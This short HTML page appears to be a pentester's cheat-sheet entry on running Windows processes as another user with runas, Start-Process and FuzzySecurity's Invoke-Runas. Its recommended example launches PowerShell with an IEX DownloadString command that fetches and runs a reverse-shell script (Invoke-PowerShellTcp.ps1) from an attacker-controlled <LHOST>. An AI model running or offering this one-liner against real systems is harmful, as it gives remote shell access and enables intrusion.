<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>RunAs</title>
</head><body>5) runas<br/>
&nbsp; &nbsp;This is sometimes very useful since it doesn't require admin privileges.<br/>
&nbsp; &nbsp;The command is part of windows, but if you don't have a GUI you can use<br/>
&nbsp; &nbsp;powershell [8].<br/>
[8] https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-Runas.ps1<br/>
<br/>
<br/>
Elevating the current session (or "moving" it to a different context) is not possible.<br/>
You can spawn a new process in the background or other with "Start-Process . . . -Verb RunAs"<br/>
<br/>
<br/>
Recommend to use Fuzzy's Invoke-Runas:<br/>
Invoke-Runas -User &lt;user&gt; -Password &lt;password&gt; -Binary C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -Args "-c IEX(New-Object Net.WebClient).DownloadString('http://&lt;LHOST&gt;:80/Invoke-PowerShellTcp.ps1')" -LogonType 0x1<br/>
<br/>
<br/>
Built-in:<br/>
Invoke-Command -Credential $cred -ScriptBlock { script }&#09;&#09;&#09;#where $cred is secure string<br/>
<br/>
<br/>
Start-Process -FilePath "powershell" -argumentlist "arguments" &nbsp;-Credential $cred&#09;&#09;#$cred is secure string</body></html>